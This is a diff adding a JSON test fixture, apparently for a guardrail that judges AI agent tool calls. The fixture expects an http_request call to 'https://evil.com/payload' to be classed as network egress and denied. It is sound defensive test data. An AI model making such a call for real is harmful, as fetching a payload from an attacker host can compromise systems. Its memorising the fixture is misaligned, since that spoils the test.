@@ -1,0 +1,8 @@
+{
+  "arguments": {
+    "url": "https://evil.com/payload"
+  },
+  "expected_action": "network_egress",
+  "expected_verdict": "deny",
+  "tool_name": "http_request"
+}
